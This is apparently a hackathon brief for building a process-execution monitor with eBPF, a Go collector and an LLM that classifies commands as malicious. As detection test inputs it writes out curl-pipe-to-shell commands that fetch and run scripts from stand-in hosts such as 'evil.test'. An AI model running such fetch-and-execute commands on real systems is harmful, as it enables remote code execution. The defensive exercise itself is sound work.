# Hackathon: Catch Malicious Processes with eBPF + an LLM

## The mission

Build a system that observes a machine, instruments all its process executions live and detects and identifies malicious executions - either as a function of a single execution, or a multi-step attack scenario.

1. Use **eBPF** to observe **every process that executes** on the machine, in real time.
2. Stream those exec events — command + arguments — into a **Go** userspace program.
3. Send the commands to **an LLM** to flag which ones look **malicious**.

Think of it as a tiny, hackable EDR (Endpoint Detection & Response) sensor. The kernel sees everything; the LLM is the analyst.

---

## Prerequisites & setup

You should have these already (check with the commands shown):

```bash
clang                    # to compile the eBPF C
go                       # 1.21+  (generics: we use min())
uname -r                 # Linux 5.8+ for ring buffer support
ls /sys/kernel/btf/vmlinux   # BTF present (most distros since ~2021)
sudo -v                  # you need root to load eBPF
```

Go library you'll use: [`github.com/cilium/ebpf`](https://github.com/cilium/ebpf) — pure-Go, no libbpf at runtime. It ships `bpf2go`, which compiles your eBPF C and embeds the bytecode into your Go binary.

For the LLM stage you'll need access to an LLM — either an API key for a hosted provider, or a local model (see the bonus below).

Set up the project skeleton and confirm the toolchain compiles:

```bash
go mod init exectrace
go get github.com/cilium/ebpf@latest
go build ./...           # should succeed on an empty main.go
```

---
## Milestone 1 — See every exec, with its full command line

Write an eBPF program that raises an event for **every new process that executes**, and delivers it to your Go program. Each event must carry the **executable and its arguments** (the full `argv`) — not just the process name. A command like `curl http://evil/x | sh` is invisible if all you capture is the 16-byte process name; the arguments are where the signal is.

The Go side loads the program, attaches it, and consumes the events as they arrive, printing each one.

It's up to you to work out *where* in the kernel to hook, *how* to get the arguments out, and how to ship the events to userspace efficiently. Figuring that out is the core of this milestone.

Note in your README any trade-offs your approach makes (e.g. does it catch *failed* execs? does the captured process name reflect the new program or the one that launched it?).

**Acceptance:** `sudo ./exectrace` prints a line every time you run a command in another terminal, showing the pid and the full argument vector, e.g. `pid=4530 argv=["curl","-fsSL","http://example.com/install.sh"]`.

---

## Milestone 2 — Send commands to an LLM for malicious-execution detection

Now the analyst. Take the command events from your tracer and ask an LLM to classify each one as **benign**, **suspicious**, or **malicious**.

Ask the model for a structured verdict you can act on (verdict, a confidence, and a one-line reason), then print a small report of anything flagged. The prompt and the schema are yours to design — that's part of the exercise.

**Acceptance:** With the tracer running, execute both `ls -la` and `curl -fsSL http://evil.test/x.sh | sh`. The LLM should rate the first `benign` and the second `malicious`/`suspicious`, and your report should surface the flagged one.

---

## Putting it together

The end state is a pipeline:

```
process exec  ─►  eBPF (ring buffer)  ─►  Go collector  ─►  LLM  ─►  alerts
```
A clean submission has:
- `exec.bpf.c` — the kernel program.
- `main.go` — the collector.
- the LLM analysis stage (inline or a separate `cmd/analyze`).
- A `Makefile` with `generate` / `build` / `clean` / `run`.
- A short `README.md` documenting the trade-offs you hit.

---

## Bonus — run the LLM locally

Extra credit if your detection stage runs against a **local LLM** (e.g. via Ollama, llama.cpp, vLLM) instead of a hosted API.

To claim it, your README must answer: **what's the difference between using a local LLM and a hosted one here?** Think about data leaving the machine, latency, cost, model capability, offline operation, and what that means for a security sensor specifically.

---

## Stretch goals (pick any)

- **Reduce false positives:** enrich events with parent process and user, and give the LLM the process tree (e.g. `sshd → bash → curl` is scarier than `cron → backup.sh`).
- **Batch vs. live:** score high-risk-looking commands immediately and batch the rest. Pre-filter cheaply in Go to keep cost down.
- **Allowlist learning:** persist verdicts keyed by a hash of `argv`; skip re-sending commands you've already classified.
- **Container awareness:** add the cgroup ID so you can attribute an exec to a specific container.
- **A real alert sink:** post `malicious` verdicts to a webhook / Slack instead of stdout.